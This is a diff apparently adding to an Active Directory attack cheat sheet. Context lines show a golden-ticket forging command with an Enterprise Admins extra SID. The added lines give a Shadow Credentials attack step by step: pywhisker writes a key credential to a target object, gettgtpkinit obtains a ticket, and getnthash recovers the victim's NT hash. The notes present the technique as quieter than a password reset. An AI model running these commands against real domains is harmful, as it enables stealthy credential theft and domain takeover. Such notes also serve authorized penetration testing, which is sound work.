@@ -85,3 +85,11 @@ ticketer.py -nthash <krbtgt-hash> -domain <child.domain> -domain-sid <child-SID>
   -extra-sid <parent-domain-SID>-519 Administrator   # 519 = Enterprise Admins RID
 ```
 
+Shadow Credentials — if you have `GenericWrite` on a user/computer object, add an attacker-controlled key credential instead of resetting their password (quieter, doesn't break their existing access):
+```bash
+python pywhisker.py -d <domain> -u <USER> -p '<PASS>' --target <TARGET> --action add   # writes msDS-KeyCredentialLink, outputs a PFX
+gettgtpkinit.py -cert-pfx <issued>.pfx -pfx-pass <pfx-password> <domain>/<TARGET> <target>.ccache
+export KRB5CCNAME=<target>.ccache
+getnthash.py -key <session-key-from-pkinit-output> <domain>/<TARGET>   # recover their NT hash via U2U
+```
+
